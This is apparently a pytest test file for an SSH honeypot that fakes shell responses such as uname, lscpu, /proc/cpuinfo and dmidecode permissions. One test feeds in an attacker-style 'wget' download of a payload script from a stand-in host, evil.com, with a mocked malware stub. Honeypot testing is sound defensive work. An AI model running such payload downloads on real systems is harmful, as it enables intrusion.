import sys
import os
import pytest
from unittest.mock import MagicMock, patch

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from ssh_honeypot.core.command_handler import CommandHandler


class TestRealisticHandlers:

    @pytest.fixture
    def handler(self):
        self.mock_llm = MagicMock()
        self.mock_db = MagicMock()
        self.mock_db.get_cached_response.return_value = None
        self.mock_db.get_user_node.return_value = None
        self.mock_db.get_fs_node.return_value = None
        h = CommandHandler(self.mock_llm, self.mock_db)
        h.payload_manager = MagicMock()
        h.payload_manager.download_and_analyze_sync.return_value = None
        return h

    def test_handle_pwd(self, handler):
        context = {"cwd": "/var/log", "user": "root"}
        resp, updates, _ = handler.handle_pwd("pwd", context)
        assert resp == "/var/log\n"
        assert updates == {}

    def test_handle_whoami(self, handler):
        context = {"cwd": "/", "user": "hackerman"}
        resp, updates, _ = handler.handle_whoami("whoami", context)
        assert resp == "hackerman\n"

    def test_handle_wget_success(self, handler):
        context = {"cwd": "/tmp", "session_id": "1"}
        cmd = "wget -O payload.sh http://evil.com/payload.sh"

        # Mock LLM
        handler.llm.generate_response.return_value = "#!/bin/bash\necho malware"

        # New behavior: Hybrid Success
        # Mock update_user_file so it doesn't try to auto-serialize our context mocks (if any)
        # We need to test the logic WITHOUT running actual DB calls
        # because the "context" object or the "handler" object might be leaking mock objects into serialization

        # Patch the INSTANCE in the universal_cache module, because handle_wget imports it from there.
        with patch("ssh_honeypot.core.universal_cache.universal_cache") as mock_uc:
            mock_uc.get.return_value = None

            # Mock update_user_file on the db mock itself
            handler.db.update_user_file = MagicMock()

            resp, updates, _ = handler.handle_wget(cmd, context)

        assert "200 OK" in resp or "Saving to" in resp

    def test_handle_wget_no_url(self, handler):
        context = {"cwd": "/tmp"}
        cmd = "wget"
        resp, updates, _ = handler.handle_wget(cmd, context)
        assert "missing URL" in resp

    def test_ls_help(self, handler):
        # Verify ls --help works
        context = {"cwd": "/"}
        for cmd in ["ls --help", "ls -l --help"]:
            resp, _, _ = handler.process_command(cmd, context)
            assert "Usage: ls" in resp
            assert "List information about the FILEs" in resp

    def test_cat_help(self, handler):
        # Verify cat --help works
        context = {"cwd": "/"}
        resp, _, _ = handler.process_command("cat --help", context)
        assert "Usage: cat" in resp
        assert "Concatenate FILE(s)" in resp

    def test_system_realism(self, handler):
        context = {"user": "root"}

        # Test uname
        resp, _, _ = handler.process_command("uname -a", context)
        assert "Linux" in resp
        assert "x86_64" in resp

        # Test lscpu (Delegated)
        resp, _, _ = handler.process_command("lscpu", context)
        assert "AMD EPYC" in resp
        assert "192" in resp  # CPU count

        # Test lspci (Delegated)
        resp, _, _ = handler.process_command("lspci", context)
        assert "NVIDIA" in resp
        assert "H100" in resp

        # Test dmidecode (Delegated, Root)
        resp, _, _ = handler.process_command("dmidecode", context)
        assert "SMBIOS" in resp

        # Test last (Delegated)
        resp, _, _ = handler.process_command("last", context)
        assert "still logged in" in resp
        assert "root" in resp

    def test_proc_files(self, handler):
        # Check if SystemHandler generates proc files
        cpuinfo = handler.system_handler.get_dynamic_file("/proc/cpuinfo")
        assert cpuinfo is not None
        assert "AMD EPYC" in cpuinfo
        assert "processor\t: 191" in cpuinfo  # Last core

        version = handler.system_handler.get_dynamic_file("/proc/version")
        assert "Linux version" in version

    def test_uname_flags(self, handler):
        context = {"user": "root"}
        # Test individual flags
        resp, _, _ = handler.process_command("uname -s", context)
        assert resp.strip() == "Linux"

        resp, _, _ = handler.process_command("uname -m", context)
        assert resp.strip() == "x86_64"

        # Test combined flags
        resp, _, _ = handler.process_command("uname -sm", context)
        assert "Linux x86_64" in resp

    def test_dmidecode_permissions(self, handler):
        # Should match root
        context = {"user": "root"}
        resp, _, _ = handler.process_command("dmidecode -s processor-version", context)
        assert "Intel" in resp

        # Should deny non-root
        context = {"user": "deploy"}
        resp, _, _ = handler.process_command("dmidecode", context)
        assert "Permission denied" in resp

    def test_uptime_format(self, handler):
        context = {"user": "root"}
        resp, _, _ = handler.process_command("uptime", context)
        # Format: 17:05:01 up 14 days,  7:22,  1 user,  load average: 0.12, 0.08, 0.02
        assert "up" in resp
        assert "days" in resp
        assert "load average:" in resp
        assert "user" in resp

    def test_cat_proc_integration(self, handler):
        # Test that 'cat /proc/cpuinfo' works via the standard command processor
        # This requires threading the SystemHandler dynamic file check into CatCommand or CommandHandler's content fetcher
        context = {"cwd": "/", "user": "root"}

        # Mocking handler._generate_or_get_content logic if not fully integrated in unit test fixture.
        # But CommandHandler._generate_or_get_content calls self.system_handler.get_dynamic_file.
        # So we just need to ensure process_command("cat ...") calls that.

        # We need to make sure the mocked DB doesn't interfere.
        # The real CommandHandler uses _generate_or_get_content.

        resp, _, _ = handler.process_command("cat /proc/cpuinfo", context)
        assert "AMD EPYC" in resp
        assert "siblings\t: 192" in resp
